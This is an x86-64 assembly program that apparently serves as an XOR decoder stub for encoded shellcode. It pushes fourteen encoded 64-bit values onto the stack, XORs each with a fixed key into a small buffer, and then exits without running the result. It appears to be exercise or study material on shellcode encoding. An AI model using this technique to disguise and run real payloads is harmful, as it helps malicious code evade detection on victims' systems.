global _start

section .bss
		my_buffer resb 8

section .text
_start:
		jmp playStack

playStack:
		mov rax, 0xa284ee5c7cde4bd7
		push rax
		mov rax, 0x935add110510849a
		push rax
		mov rax, 0x10b29a9dab697500
		push rax
		mov rax, 0x200ce3eb0d96459a
		push rax
		mov rax, 0xe64c30e305108462
		push rax
		mov rax, 0x69cd355c7c3e0c51
		push rax
		mov rax, 0x65659a2584a185d6
		push rax
		mov rax, 0x69ff00506c6c5000
		push rax
		mov rax, 0x3127e434aa505681
		push rax
		mov rax, 0x6af2a5571e69ff48
		push rax
		mov rax, 0x6d179aaff20709e6
		push rax
		mov rax, 0x9ae3f152315bf1c9
		push rax
		mov rax, 0x373ab4bb0900179a
		push rax
		mov rax, 0x69751244059aa2a3
		push rax
		mov rbx, 0x2144d2144d2144d2

		mov rcx, 14
		mov rdx, rsp

decoder:
		xor rax, rax

		mov r8, [rdx]
		xor r8, rbx
		mov [my_buffer], r8
		add rdx, 8
		loop decoder

exit:
		xor rax, rax
		mov rax, 60
		xor rdi, rdi
		syscall





